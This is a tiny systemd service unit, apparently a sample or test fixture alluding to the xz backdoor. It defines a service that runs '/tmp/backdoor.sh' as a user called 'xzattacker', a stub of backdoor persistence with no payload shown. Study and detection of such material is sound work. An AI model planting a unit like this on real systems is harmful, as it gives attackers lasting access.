# xz.service
[Unit]

Description=xz service

[Service]

User=xzattacker
ExecStart=/tmp/backdoor.sh
